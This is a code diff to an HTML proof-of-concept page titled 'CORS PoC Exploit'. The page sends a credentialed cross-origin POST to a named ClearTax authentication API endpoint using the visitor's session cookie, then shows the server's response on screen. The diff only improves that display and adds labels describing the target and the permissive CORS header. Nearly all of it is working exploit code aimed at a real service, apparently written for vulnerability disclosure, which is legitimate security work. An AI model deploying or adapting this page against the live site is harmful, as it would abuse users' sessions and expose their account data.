@@ -5,21 +5,30 @@
                 var xhttp = new XMLHttpRequest();
                 xhttp.onreadystatechange = function() {
                     if (this.readyState == 4 && this.status == 200) {
-                        document.getElementById("demo").innerHTML = alert(this.responseText);
+                        alert("✅ Response:\n\n" + this.responseText);
+                        document.getElementById("result").innerHTML = "<h3>✅ Success!</h3><pre>" + this.responseText + "</pre>";
+                    } else if (this.readyState == 4) {
+                        alert("Status: " + this.status + "\n\nResponse:\n" + this.responseText);
+                        document.getElementById("result").innerHTML = "<h3>Status: " + this.status + "</h3><pre>" + this.responseText + "</pre>";
                     }
                 };
                 xhttp.open('POST', "https://app.mea.cleartax.com/api/kramer/v0/in-app-notification/action/authenticate", true);
                 xhttp.withCredentials = true;
                 xhttp.setRequestHeader('Content-Type', 'application/json');
                 xhttp.send('{}');
+                document.getElementById("result").innerHTML = "<h3>⏳ Sending request...</h3>";
             }
         </script>
     </head>
     <body>
         <center>
             <h2>[!] CORS PoC Exploit!!!</h2>
-            <div id="demo">
+            <h3>Target: POST /api/kramer/v0/in-app-notification/action/authenticate</h3>
+            <p>Server allows: Access-Control-Allow-Origin: *</p>
+            <div id="result">
                 <button type="button" onclick="cors()">Exploit</button>
+                <br><br>
+                <p style="color:gray;font-size:12px;">This will send a request with your ClearTax session cookie</p>
             </div>
         </center>
     </body>
